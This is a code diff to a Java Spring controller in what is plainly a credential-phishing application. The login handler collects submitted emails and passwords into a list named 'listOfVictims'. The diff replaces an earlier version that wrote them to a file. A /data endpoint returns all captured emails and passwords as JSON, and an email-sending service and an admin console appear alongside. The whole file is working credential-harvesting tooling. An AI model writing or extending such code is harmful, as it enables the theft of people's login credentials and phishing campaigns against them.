@@ -17,12 +17,14 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.util.ArrayList;
 
 @org.springframework.stereotype.Controller
 public class AppController {
 
     final String fileName = "data.txt";
     final String delimiter = ",";
+    ArrayList<Credentials> listOfVictims = new ArrayList<>();
 
     @Autowired
     private EmailSenderService service;
@@ -37,29 +39,27 @@ public class AppController {
     public String loginSubmit(@ModelAttribute Credentials credentials, Model model) throws IOException {
 
         final String newLineString = "\n";
+        listOfVictims.add(credentials);
+        /*
         String sensitiveContent = newLineString + credentials.getEmail() + delimiter + credentials.getPassword();
         Files.writeString(Paths.get(fileName), sensitiveContent, StandardCharsets.UTF_8, StandardOpenOption.CREATE,
                 StandardOpenOption.APPEND);
-
+        */
         return "result";
     }
 
     @GetMapping("/data")
     @ResponseBody
     public String getData() throws IOException {
-        String fileData = Files.readString(Paths.get(fileName), StandardCharsets.UTF_8);
-        System.out.println(fileData);
-        String[] dataStr = fileData.split(System.lineSeparator());
         JSONObject result = new JSONObject();
         JSONArray data = new JSONArray();
-        for(String s : dataStr){
-            String[] parts = s.split(delimiter);
-            if(parts.length < 2) continue;
-            String singleUserJsonString = String.format("{ \"email\": \"%s\", \"password\": \"%s\" }", parts[0], parts[1]);
-            System.out.println(singleUserJsonString);
+        for(Credentials c : listOfVictims){
+            String singleUserJsonString = String.format("{ \"email\": \"%s\", \"password\": \"%s\" }", c.getEmail()
+                    , c.getPassword());
             JSONObject jsonObject = new JSONObject(singleUserJsonString);
             data.put(jsonObject);
         }
+        result.put("result", data);
         return result.toString();
     }
 
@@ -80,6 +80,12 @@ public class AppController {
             service.sendSimpleEmail(email, emailInfo.getEmailContent(), subject);
         }
         return "mail-sent";
+    }
+
+    @GetMapping("/")
+    @ResponseBody
+    public String homePage() {
+        return "Go to the /admin-console endpoint to access the admin console";
     }
 
 }
